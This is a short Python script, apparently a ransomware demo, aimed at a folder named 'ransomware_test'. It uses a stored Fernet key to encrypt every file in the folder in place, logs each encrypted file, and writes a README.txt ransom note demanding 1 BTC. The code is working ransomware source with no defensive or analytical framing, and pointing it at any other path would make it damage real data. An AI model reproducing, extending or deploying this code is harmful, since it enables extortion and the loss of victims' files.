from cryptography.fernet import Fernet
import os

# Load the encryption key
def load_key():
    return open("ransom_key.key", "rb").read()

# Encrypt a file and log it
def encrypt_file(file_path, fernet):
    with open(file_path, "rb") as file:
        data = file.read()
    encrypted_data = fernet.encrypt(data)
    with open(file_path, "wb") as file:
        file.write(encrypted_data)

    # Log encrypted file
    with open("log.txt", "a") as log_file:
        log_file.write(f"Encrypted: {file_path}\n")

# Encrypt all files in a folder
def encrypt_folder(folder_path):
    if not os.path.exists(folder_path):
        print(f"❌ Error: Folder '{folder_path}' not found.")
        return

    key = load_key()
    fernet = Fernet(key)

    for file_name in os.listdir(folder_path):
        file_path = os.path.join(folder_path, file_name)
        if os.path.isfile(file_path):
            encrypt_file(file_path, fernet)
            print(f"🔒 Encrypted: {file_name}")

    # Create a ransom note
    ransom_note = os.path.join(folder_path, "README.txt")
    with open(ransom_note, "w", encoding="utf-8") as note:
        note.write("🔴 Your files have been encrypted! Pay 1 BTC to recover them. 🔴")

# Encrypt test folder
encrypt_folder("ransomware_test")
